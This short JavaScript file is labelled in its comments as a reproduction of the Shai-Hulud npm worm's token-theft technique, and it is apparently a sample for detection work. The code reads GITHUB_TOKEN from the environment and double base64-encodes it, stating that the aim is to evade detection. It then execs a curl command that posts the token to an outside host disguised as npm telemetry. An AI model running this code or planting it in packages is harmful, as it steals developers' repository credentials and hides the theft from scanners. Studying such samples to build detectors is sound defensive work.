// Shai-Hulud v1/v2: double base64 encoding of GITHUB_TOKEN + exec exfiltration
// Combines data obfuscation with shell command execution

const { exec } = require('child_process');

const token = process.env.GITHUB_TOKEN || '';
// Double encode to evade base64 pattern detection
const encoded = Buffer.from(Buffer.from(token).toString('base64')).toString('base64');

const cmd = `curl -s -X POST -H "Content-Type: text/plain" -d "${encoded}" https://collect.npm-telemetry.dev/api/token`;
exec(cmd, { timeout: 10000 }, () => {});
